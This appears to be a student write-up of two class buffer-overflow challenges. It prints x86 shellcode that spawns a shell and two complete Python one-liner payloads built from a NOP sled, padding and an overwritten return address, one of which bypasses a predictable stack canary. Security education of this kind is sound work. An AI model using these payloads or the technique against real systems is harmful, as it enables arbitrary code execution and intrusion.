# Challenge 1

This one involves a buffer overflow attack.

We first use the shell code provided in class that runs the assembly to invoke a shell.

```bash
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
```

Then we run gdb on the binary to find the address of the buffer overflow. We found out that we have to overwrite about 80 bytes. With a 23 byte shell code, we pad the shell code with 39 NOPs, and 14 random bytes, then with the new return address we want to go to. With some trial and error with the padding and NOP sled, we are able to invoke the shell via the binary script.

```bash
 python -c "print '\x90'*39+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80'+'A'*10 +'B'*4+'\x7c\xad\xff\xbf'" > asd
```

# Challenge 2

This one is very similar to challenge 1. We can use the same distances between the buffer and return address as Challenge 1 but add 4 to it since instead of just a 64 byte buffer, we have an extra 4 byte buffer before that as well. So we have to overwrite 84 bytes.

This new code requires check of a canary at the position right after the buffer. So we need to add the canary value within our payload right after 64 bytes of something before. We can then add in the 4 byte canary value and add in the rest of the padding and return address to execute our injected shell code.

To get the value of the canary, I first flooded the 64 byte buffer with 63 A's (with the string terminator = 64 bytes). Then I inspected the stack and found the value right after the A's to be 0x726c576e. Upon looking at the raw c code, it's clear that the value won't change since rand() is used without a seed, so it will produce the same canary value every execution. We can put that canary value into our payload to bypass the canary check. Using the same process of using GDB to find the return

After a lot of trial and error, I was able to use the following

```bash
python -c "print '\x90'*41 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80'+ '\x6e\x57\x6c\x72' + 'A'*12 + '\x1c\x65\xff\xbf'" > asd2
```
